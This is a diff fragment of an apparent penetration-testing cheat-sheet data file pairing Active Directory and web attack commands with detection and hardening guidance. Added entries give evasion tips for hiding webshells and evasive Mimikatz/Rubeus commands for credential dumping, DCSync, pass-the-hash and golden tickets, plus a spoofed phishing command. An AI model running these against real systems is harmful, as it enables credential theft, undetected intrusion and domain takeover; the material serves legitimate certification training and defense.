+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       }
     },
     {
@@ -16582,7 +17518,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1595.002",
           "OWASP A05:2021"
-        ]
+        ],
+        "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
       }
     },
     {
@@ -16674,7 +17611,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1505.003",
           "OWASP A04:2021"
-        ]
+        ],
+        "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
       }
     },
     {
@@ -16760,7 +17698,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1190",
           "OWASP A03:2021"
-        ]
+        ],
+        "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
       }
     },
     {
@@ -16829,6 +17768,11 @@ const COMMAND_DATA = {
           "id": "drupalgeddon3-msf",
           "note": "Authenticated Metasploit variant.",
           "rel": "alternative"
+        },
+        {
+          "id": "gs-reverse-shells",
+          "rel": "next",
+          "note": "Turn the unauth RCE into an interactive reverse shell"
         }
       ],
       "id": "drupalgeddon2",
@@ -16928,6 +17872,11 @@ const COMMAND_DATA = {
           "id": "drupal-detect",
           "note": "Scopes the target version.",
           "rel": "prereq"
+        },
+        {
+          "id": "gs-privesc-enum",
+          "rel": "next",
+          "note": "Foothold on the Linux host — start privesc enumeration"
         }
       ],
       "id": "drupalgeddon3-msf",
@@ -16953,7 +17902,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1190",
           "OWASP A06:2021"
-        ]
+        ],
+        "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
       }
     },
     {
@@ -17038,6 +17988,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "dsquery"
+      ],
+      "variations": [
+        {
+          "label": "Kerberoastable (SPN set)",
+          "command": "dsquery * -filter \"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\" -attr samAccountName"
+        },
+        {
+          "label": "AS-REP roastable (no preauth)",
+          "command": "dsquery * -filter \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" -attr samAccountName"
+        }
       ]
     },
     {
@@ -17141,7 +18101,13 @@ const COMMAND_DATA = {
         "misconfiguration": "DsrmAdminLogonBehavior left at 2 from a previous admin action. DSRM password never rotated (same since DC promotion). No Sysmon rule monitoring Lsa registry key. MDI not deployed on DCs.",
         "vulnerable_config": "# DsrmAdminLogonBehavior = 2 (remote NTLM logon enabled for DSRM account):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').DsrmAdminLogonBehavior\n# Returns 2 = DSRM account usable for remote PtH to DC = CRITICAL\n\n# DSRM hash extractable via:\n# Invoke-Mimikatz -Command 'lsadump::sam' -ComputerName DC01\n# Then PtH: Invoke-Mimikatz -Command 'sekurlsa::pth /user:Administrator /domain:DC01 /ntlm:<dsrm-hash>'",
         "secure_config": "# Ensure DsrmAdminLogonBehavior = 0 on all DCs via GPO preferences:\n# Computer Config → Preferences → Windows Settings → Registry → New Registry Item:\n# Hive: HKEY_LOCAL_MACHINE\n# Key: SYSTEM\\CurrentControlSet\\Control\\Lsa\n# Value name: DsrmAdminLogonBehavior\n# Value type: REG_DWORD\n# Value data: 0\n\n# PowerShell (run on each DC):\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior -Value 0\n\n# Rotate DSRM password on all DCs:\nntdsutil 'set dsrm password' 'reset password on server DC01' quit quit\n\n# SIEM/Sysmon alert:\n# Sysmon Event 13: TargetObject contains 'DsrmAdminLogonBehavior' AND Details = 'DWORD (0x00000002)' → CRITICAL"
-      }
+      },
+      "variations": [
+        {
+          "label": "Get the DSRM (local admin) hash via DCSync",
+          "command": "lsadump::lsa /inject /name:<dc_name>$"
+        }
+      ]
     },
     {
       "id": "cdsa-m10-dynamic-analysis",
@@ -17503,7 +18469,7 @@ const COMMAND_DATA = {
         },
         {
           "title": "swaks",
-          "url": "http://www.jetmore.org/john/code/swaks/"
+          "url": "https://www.jetmore.org/john/code/swaks/"
         },
         {
           "title": "OffSec PEN-200 - Penetration Testing with Kali Linux",
@@ -17542,12 +18508,12 @@ const COMMAND_DATA = {
         {
           "description": "Send phishing email with malicious attachment (OSCP Ch26 style — .Library-ms file)",
           "command": "swaks -t <recipient1> -t <recipient2> --from <spoofed_sender> --attach @<malicious_file> --server <smtp_ip> --body @<body_txt> --header \"Subject: <subject>\" --suppress-data -ap",
-          "label": "swaks (spoof)"
+          "label": "swaks - spoof w/ attachment"
         },
         {
           "description": "Send test email to verify open relay (no auth, unauthenticated)",
           "command": "swaks --from <spoofed_from> --to <recipient> --server <smtp_ip> --body 'Test relay' --header 'Subject: Test'",
-          "label": "swaks (spoof)"
+          "label": "swaks - relay test"
         }
       ],
       "type": "command"
@@ -17623,7 +18589,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "o365spray enumerates and password-sprays Microsoft 365 accounts, exploiting weak/reused passwords against cloud auth.",
+        "why_it_works": "Office365 login and autodiscover endpoints reveal whether a tenant/user exists and accept password guesses with weak per-tenant lockout, enabling enumeration and spraying against the cloud.",
         "prerequisites": "A user list, candidate password(s), and internet access to M365 endpoints.",
         "impact": "Compromised M365 accounts - cloud foothold, email, and Azure AD access.",
         "detection": "Azure AD sign-in logs show failed sign-ins across many users from one source; impossible-travel; smart-lockout events.",
@@ -17712,7 +18678,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Online password brute-force/guessing against a mail service (IMAP/POP3/SMTP AUTH) to obtain mailbox credentials.",
+        "why_it_works": "The service performs no (or weak) rate-limiting/lockout, so an attacker can submit many username/password guesses. Password reuse and weak/default passwords mean a modest wordlist often lands a valid credential. SMTP/IMAP/POP3 accept AUTH attempts and rarely lock out.",
         "prerequisites": "Network access to the mail service and username/password lists.",
         "impact": "Valid mailbox credentials - access to email and a pivot for internal phishing.",
         "detection": "Failed authentication bursts: Windows 4625 / Kerberos 4771 at abnormal rate; account lockouts (4740); many attempts from one source, or (spraying) one password across many accounts. Service-specific auth logs show the same spike.",
@@ -17801,7 +18767,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Enumerates valid email/usernames via SMTP VRFY/EXPN/RCPT TO responses (valid vs unknown differ).",
+        "why_it_works": "SMTP VRFY/EXPN/RCPT commands return different responses for valid vs invalid mailboxes, leaking which usernames exist without authenticating.",
         "prerequisites": "Network access to SMTP (25/587).",
         "impact": "A validated user list for spraying/phishing.",
         "detection": "[MITRE T1087.003] bursts of VRFY/EXPN/RCPT commands in mail logs; unknown-vs-valid response patterns.",
@@ -18052,6 +19018,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "powershell"
+      ],
+      "variations": [
+        {
+          "label": "With PSCredential",
+          "command": "Enter-PSSession -ComputerName <target> -Credential (Get-Credential)"
+        },
+        {
+          "label": "Over an existing session var",
+          "command": "$s = New-PSSession -ComputerName <target> -Credential $cred; Enter-PSSession $s"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Build a credential object",
+          "command": "$cred = New-Object System.Management.Automation.PSCredential('<domain>\\<user>',(ConvertTo-SecureString '<password>' -AsPlainText -Force))"
+        },
+        {
+          "label": "Open the remote session",
+          "command": "Enter-PSSession -ComputerName <target> -Credential $cred"
+        }
       ]
     },
     {
@@ -18115,7 +19101,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "enum4linux enumerates users, groups, shares, and policy over SMB/RPC, often via null sessions.",
+        "why_it_works": "SMB null sessions and SAMR/LSARPC expose users, groups, shares, and policy on misconfigured or legacy hosts; enum4linux automates those RPC queries.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "A broad SMB/RPC enumeration of the domain.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -18133,6 +19119,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "enum4linux"
+      ],
+      "variations": [
+        {
+          "label": "Verbose all",
+          "command": "enum4linux -a -v <dc_ip>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Full SMB/RPC enumeration (users, shares, policy)",
+          "command": "enum4linux -A <dc_ip>"
+        },
+        {
+          "label": "Follow up on interesting shares/users",
+          "command": "# feed usernames into kerbrute / spraying"
+        }
       ]
     },
     {
@@ -18200,7 +19202,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "enum4linux-ng is the modernised enumerator (users, groups, shares, policy, RID cycling) with cleaner output.",
+        "why_it_works": "SMB/RPC (SAMR, LSARPC) on a Windows/Samba host expose users, groups, shares, and the password policy — often to null/guest sessions on legacy configs — which enum4linux-ng aggregates.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "Structured SMB/RPC enumeration incl. password policy.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -18218,6 +19220,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "enum4linux-ng"
+      ],
+      "variations": [
+        {
+          "label": "With creds",
+          "command": "enum4linux-ng -u <user> -p <password> -A <dc_ip> -oA out"
+        }
       ]
     },
     {
@@ -18980,10 +19988,6 @@ const COMMAND_DATA = {
       "description": "World-writable files (especially root-run scripts/cron targets) and directories are prime escalation vectors. Prunes /proc to reduce noise.",
       "variations": [
         {
-          "label": "Files",
-          "command": "find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null"
-        },
-        {
           "label": "Directories",
           "command": "find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null"
         }
@@ -19471,6 +20475,103 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "crtp-evasive-mimikatz",
+      "name": "Evasive Mimikatz / Rubeus Verb Reference (via Loader)",
+      "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-keys\" \"exit\"",
+      "description": "The CRTP course ships a customized Mimikatz/SafetyKatz whose commands are prefixed 'evasive-' (and Rubeus 'evasive-golden/silver') to avoid signature/behaviour detection. Run them in-memory through Loader.exe. This is the exact syntax used against Defender/MDE in the lab and exam - keep it handy.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Evasion",
+      "type": "cheatsheet",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "loud",
+      "mitre": [
+        "T1003.001",
+        "T1003.006",
+        "T1558.001",
+        "T1547.005"
+      ],
+      "tools": [
+        "SafetyKatz",
+        "Rubeus",
+        "Loader.exe",
+        "mimikatz"
+      ],
+      "tags": [
+        "mimikatz",
+        "evasive",
+        "credential-access",
+        "cheatsheet",
+        "safetykatz",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "Dump logon passwords (evasive)",
+          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-logonpasswords\" \"exit\""
+        },
+        {
+          "label": "Dump encryption keys (ekeys)",
+          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-ekeys\" \"exit\""
+        },
+        {
+          "label": "Pass-the-hash into a new process",
+          "command": "Loader.exe -Path <safetykatz_exe> -args \"sekurlsa::evasive-pth /domain:<dc> /user:Administrator /ntlm:<ntlm>\" \"exit\""
+        },
+        {
+          "label": "DCSync a user (get krbtgt hash)",
+          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\""
+        },
+        {
+          "label": "Dump LSA secrets / local SAM",
+          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-lsa /patch\" \"exit\"    # or lsadump::evasive-sam"
+        },
+        {
+          "label": "Dump inter-realm trust keys",
+          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-trust /patch\" \"exit\""
+        },
+        {
+          "label": "Elevate token + read DPAPI vault creds",
+          "command": "Invoke-Mimi -Command '\"token::evasive-elevate\" \"vault::cred /patch\"'"
+        },
+        {
+          "label": "Rubeus evasive golden / silver ticket",
+          "command": "Loader.exe -path <rubeus_exe> -args evasive-golden /aes256:<aes> /user:Administrator /id:500 /domain:<domain> /sid:<sid> /ptt"
+        }
+      ],
+      "notes": "Verb map (evasive- prefix on the CRTP custom build):\n- sekurlsa::evasive-logonpasswords / evasive-keys / evasive-ekeys - creds & Kerberos keys from LSASS (T1003.001)\n- sekurlsa::evasive-pth - pass-the-hash into a new logon session\n- lsadump::evasive-dcsync /user:<domain>\\krbtgt - pull krbtgt/any hash via replication (feeds golden ticket)\n- lsadump::evasive-lsa /patch  |  lsadump::evasive-sam - LSA secrets / local SAM\n- lsadump::evasive-trust /patch - inter-realm trust keys (feeds cross-domain/forest tickets)\n- token::evasive-elevate + vault::cred /patch - elevate then dump Credential Manager/DPAPI vault (scheduled-task creds etc.)\n- misc::memssp - register a malicious SSP so future logons are logged in plaintext to C:\\Windows\\System32\\mimilsa.log (credential-capture persistence)\n- misc::skeleton - skeleton key (see crtp-skeleton-key)\n- crypto::certificates /export - export machine/user certificates (cert theft / PKINIT)\n- Rubeus evasive-golden / evasive-silver - forge tickets in-memory\nAlways run through crtp-loader (ETW/AMSI unhook). If a verb still gets flagged, obfuscate the binary (crtp-tool-obfuscation) and re-check with DefenderCheck.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "MITRE ATT&CK T1003 - OS Credential Dumping",
+          "url": "https://attack.mitre.org/techniques/T1003/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-loader",
+          "note": "These verbs are run in-memory through Loader.exe",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-overpass-hash",
+          "note": "Use evasive-keys/ekeys output for overpass-the-hash",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-golden-ticket",
+          "note": "evasive-dcsync krbtgt feeds the golden ticket",
+          "rel": "next"
+        }
+      ]
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -19557,7 +20658,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552",
           "MITRE T1552.006"
-        ]
+        ],
+        "evasion": "Read only the events you need (targeted query) rather than exporting whole logs."
       }
     },
     {
@@ -19622,7 +20724,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "evil-winrm authenticates over WinRM using an NTLM hash (-H) for an interactive PowerShell session on the target.",
+        "why_it_works": "NTLM/Kerberos authenticate the account's SECRET (its NT hash or Kerberos key), not the plaintext password — the KDC/target never sees the password itself. So possessing the hash/ticket is equivalent to knowing the password: you inject it and authenticate as that user without ever cracking it. evil-winrm -H authenticates to WinRM with the hash instead of a password.",
         "prerequisites": "A valid NTLM hash for a WinRM-enabled account and 5985/5986 reachable.",
         "impact": "An interactive remote PowerShell session as the target account via PtH.",
         "detection": "[MITRE T1550.002] Event 4624 Logon Type 3 with Authentication Package NTLM and LogonProcessName NtLmSsp, with NO preceding interactive logon for that account; the same NTLM hash authenticating from an unusual source; 4672 for privileged PtH.",
@@ -19725,6 +20827,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "evil-winrm"
+      ],
+      "variations": [
+        {
+          "label": "Pass-the-hash",
+          "command": "evil-winrm -i <target> -u <user> -H <nt_hash>"
+        },
+        {
+          "label": "With scripts/executables dir",
+          "command": "evil-winrm -i <target> -u <user> -p <password> -s /opt/scripts -e /opt/bins"
+        }
       ]
     },
     {
@@ -19860,7 +20972,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M24",
           "MITRE T1595"
-        ]
+        ],
+        "evasion": "Throttle and randomize the screenshot/probe sweep; use a normal User-Agent; scope to in-scope hosts to avoid a fan-out pattern."
       }
     },
     {
@@ -20037,10 +21150,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "Basic",
-          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>:<port>/FUZZ"
-        },
         {
           "label": "Recursive + Extensions",
           "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>:<port>/FUZZ -recursion -recursion-depth 1 -e .php -v"
@@ -20270,10 +21379,6 @@ const COMMAND_DATA = {
         {
           "label": "Extension Fuzz",
           "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<ip>:<port>/<dir>/indexFUZZ"
-        },
-        {
-          "label": "Page Fuzz",
-          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>:<port>/<dir>/FUZZ.php"
         }
       ],
       "opsec": "moderate",
@@ -20365,10 +21470,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "GET",
-          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<host>:<port>/<page>?FUZZ=key -fs <size>"
-        },
         {
           "label": "POST",
           "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<host>:<port>/<page> -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs <size>"
@@ -20573,7 +21674,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Web application exposes too much information on 404 responses (different content-length for existing vs non-existing resources), has no rate limiting on HTTP requests, and serves files/directories that should not be publicly accessible without authentication.",
         "vulnerable_config": "# nginx returning size-different 404s (enumerable):\n# Valid path:   HTTP 200, Content-Length: 5432\n# Invalid path: HTTP 404, Content-Length: 153\n# Different sizes confirm existence — ffuf --fs 153 filters out 404s\n# No rate limiting: 1000 requests/second accepted without throttling",
-        "secure_config": "# Consistent 404 responses (same content-length for all 404s):\n# Serve a uniform custom 404 page:\nerror_page 404 /404.html;\nlocation = /404.html { root /var/www/html; internal; }\n# All 404s return same body -> ffuf can't distinguish valid vs invalid\n\n# Rate limiting (nginx):\nlimit_req_zone $binary_remote_addr zone=web:10m rate=10r/s;\nserver {\n    limit_req zone=web burst=50 nodelay;\n}\n\n# WAF: block requests from IPs exceeding 100 req/min to 404 paths"
+        "secure_config": "# Consistent 404 responses (same content-length for all 404s):\n# Serve a uniform custom 404 page:\nerror_page 404 /404.html;\nlocation = /404.html { root /var/www/html; internal; }\n# All 404s return same body -> ffuf can't distinguish valid vs invalid\n\n# Rate limiting (nginx):\nlimit_req_zone $binary_remote_addr zone=web:10m rate=10r/s;\nserver {\n    limit_req zone=web burst=50 nodelay;\n}\n\n# WAF: block requests from IPs exceeding 100 req/min to 404 paths",
+        "code_review": "RED FLAGS (source): object fetched by a request-supplied id with NO ownership/authorization check.\n  SELECT * FROM x WHERE id = req.params.id   (no AND owner_id = session.user)  |  findById(req.query.id) returned directly\nGREP:  grep -rniE \"findById|WHERE id ?= ?(\\$_|req\\.|params)|/:(id|uid|user_id)\" .\nSAFE:  enforce OBJECT-LEVEL authorization on every access (verify the resource belongs to the caller); use unpredictable IDs (UUID) as defense-in-depth only."
       },
       "variations": [
         {
@@ -20842,10 +21944,6 @@ const COMMAND_DATA = {
       "subcategory": "File Upload",
       "variations": [
         {
-          "label": "PHP",
-          "command": ".phtml .php3 .php4 .php5 .php7 .phps .pht .phar .pgif .inc"
-        },
-        {
           "label": "ASP / ASPX",
           "command": ".asp .aspx .config .cer .asa .cdx .ashx .asmx .aspq .axd"
         },
@@ -20931,6 +22029,11 @@ const COMMAND_DATA = {
           "id": "directory-traversal",
           "rel": "prereq",
           "note": "A write-path traversal is often what delivers the key."
+        },
+        {
+          "id": "gs-privesc-enum",
+          "rel": "next",
+          "note": "SSH access as the target user — start privesc enumeration"
         }
       ],
       "references": [
@@ -20957,7 +22060,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Upload handler writes to a path derived from user input without sanitization. Web server process has write access to ~/.ssh/. No file type validation or path restriction. SSH AuthorizedKeysFile points to a world-writable location. authorized_keys not immutable.",
         "vulnerable_config": "# PHP upload handler — path traversal vulnerability:\nmove_uploaded_file($_FILES['file']['tmp_name'],\n  '/var/www/uploads/' . $_FILES['file']['name'])  // VULNERABLE if name = '../../.ssh/authorized_keys'\n\n# Python Flask — arbitrary write:\n@app.route('/upload', methods=['POST'])\ndef upload():\n  f = request.files['file']\n  dest = os.path.join('/uploads', f.filename)  // VULNERABLE: no normalization\n  f.save(dest)\n\n# sshd_config — default, accepts key auth:\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys  # writable by web process = full takeover\n\n# File permissions vuln:\n# drwxrwxrwx 2 www-data www-data /var/www/.ssh/   # world-writable .ssh dir",
-        "secure_config": "# PHP — safe upload with allowlist and path restriction:\n$allowed_ext = ['jpg','png','pdf','txt'];\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_ext)) die('Invalid file type');\n$safe_name = bin2hex(random_bytes(8)) . '.' . $ext;  // random name, no user input\n$dest = '/var/uploads/user_files/' . $safe_name;     // fixed directory, no traversal possible\nmove_uploaded_file($_FILES['file']['tmp_name'], $dest);\n\n# Python Flask — safe:\nimport os, secrets\nfrom werkzeug.utils import secure_filename\nALLOWED = {'png','jpg','pdf'}\n@app.route('/upload', methods=['POST'])\ndef upload():\n  f = request.files['file']\n  ext = f.filename.rsplit('.',1)[-1].lower()\n  if ext not in ALLOWED: abort(400)\n  fname = secrets.token_hex(8) + '.' + ext\n  f.save(os.path.join('/var/uploads', fname))\n\n# sshd_config — restrict to specific users/groups:\nAllowUsers deploy admin\nPubkeyAuthentication yes\nPasswordAuthentication no\n\n# Immutable authorized_keys:\nchattr +i /home/webuser/.ssh/authorized_keys\nchmod 600 /home/webuser/.ssh/authorized_keys\nchown webuser:webuser /home/webuser/.ssh/authorized_keys\n\n# auditd rule:\necho '-w /home/webuser/.ssh/authorized_keys -p wa -k ssh_key_mod' >> /etc/audit/rules.d/audit.rules\naugenrules --load"
+        "secure_config": "# PHP — safe upload with allowlist and path restriction:\n$allowed_ext = ['jpg','png','pdf','txt'];\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_ext)) die('Invalid file type');\n$safe_name = bin2hex(random_bytes(8)) . '.' . $ext;  // random name, no user input\n$dest = '/var/uploads/user_files/' . $safe_name;     // fixed directory, no traversal possible\nmove_uploaded_file($_FILES['file']['tmp_name'], $dest);\n\n# Python Flask — safe:\nimport os, secrets\nfrom werkzeug.utils import secure_filename\nALLOWED = {'png','jpg','pdf'}\n@app.route('/upload', methods=['POST'])\ndef upload():\n  f = request.files['file']\n  ext = f.filename.rsplit('.',1)[-1].lower()\n  if ext not in ALLOWED: abort(400)\n  fname = secrets.token_hex(8) + '.' + ext\n  f.save(os.path.join('/var/uploads', fname))\n\n# sshd_config — restrict to specific users/groups:\nAllowUsers deploy admin\nPubkeyAuthentication yes\nPasswordAuthentication no\n\n# Immutable authorized_keys:\nchattr +i /home/webuser/.ssh/authorized_keys\nchmod 600 /home/webuser/.ssh/authorized_keys\nchown webuser:webuser /home/webuser/.ssh/authorized_keys\n\n# auditd rule:\necho '-w /home/webuser/.ssh/authorized_keys -p wa -k ssh_key_mod' >> /etc/audit/rules.d/audit.rules\naugenrules --load",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       }
     },
     {
@@ -21042,7 +22146,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credentials are stored in plaintext in browser saved passwords, application config files, scripts, log files, and SMB shares. Network captures contain cleartext protocol credentials (FTP, HTTP Basic, LDAP simple bind). No DLP (Data Loss Prevention) monitoring prevents credential exfiltration.",
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
-        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
+        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
+        "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       },
       "type": "command"
     },
@@ -21417,7 +22522,13 @@ const COMMAND_DATA = {
         "misconfiguration": "Forest trust with SID filtering disabled (must be explicitly disabled — default is filtering enabled for forest trusts). Bidirectional trust when unidirectional was intended. No MDI across both forests.",
         "vulnerable_config": "# SID filtering disabled on forest trust (explicitly misconfigured):\nGet-ADTrust -Filter {Target -eq 'TRUSTED.COM'} | Select-Object SIDFilteringForestAware\n# SIDFilteringForestAware: False → SID History crosses forest boundary → CRITICAL\n\n# Trust key extractable via DCSync of trust account:\n# mimikatz lsadump::trust /patch → inter-realm trust key\n# → forge inter-realm TGT with TRUSTED.COM EA SID → access TRUSTED.COM as EA",
         "secure_config": "# Enable SID filtering on forest trust:\nnetdom trust TRUSTED.COM /domain:CORP.LOCAL /enablesidhistory:no /filtersids:yes\n\n# Verify:\n(Get-ADTrust -Filter {Target -eq 'TRUSTED.COM'}).SIDFilteringForestAware  # Should be True\n\n# Use Selective Authentication (limit which resources cross-forest users can access):\nSet-ADTrust -Identity 'TRUSTED.COM' -SelectiveAuthentication $true\n# Then explicitly grant 'Allowed to authenticate' on specific resources\n\n# Deploy MDI on forest root DCs of both forests:\n# MDI cross-forest trust monitoring detects anomalous inter-realm tickets"
-      }
+      },
+      "variations": [
+        {
+          "label": "Request an inter-realm TGS",
+          "command": "Rubeus.exe asktgs /service:cifs/<target_dc>.<target_forest> /dc:<target_dc> /ptt /ticket:<inter_realm_tgt>"
+        }
+      ]
     },
     {
       "id": "ad-fping-sweep",
@@ -21479,7 +22590,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "fping sweeps the internal subnet for live hosts to map the AD environment's machines.",
+        "why_it_works": "Live hosts answer ICMP/ARP; fping sends probes across a CIDR in parallel and reports responders, mapping the reachable attack surface fast.",
         "prerequisites": "Network access to the internal subnet.",
         "impact": "A live-host list for further enumeration and targeting.",
         "detection": "[MITRE T1018] a burst of ICMP across the subnet from one source; internal host-discovery pattern.",
@@ -21496,6 +22607,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "fping"
+      ],
+      "variations": [
+        {
+          "label": "Just alive hosts",
+          "command": "fping -asgq <cidr> 2>/dev/null"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Sweep the subnet for live hosts",
+          "command": "fping -asgq <cidr>"
+        },
+        {
+          "label": "Feed live IPs into nmap",
+          "command": "nmap -sV -iL live.txt -oA services"
+        }
       ]
     },
     {
@@ -21717,10 +22844,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Medusa",
-          "command": "medusa -u <user> -P /usr/share/wordlists/rockyou.txt -h <ip> -M ftp"
-        },
-        {
           "label": "Hydra",
           "command": "hydra -L users.list -P passwords.list ftp://<ip>"
         }
@@ -21731,7 +22854,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
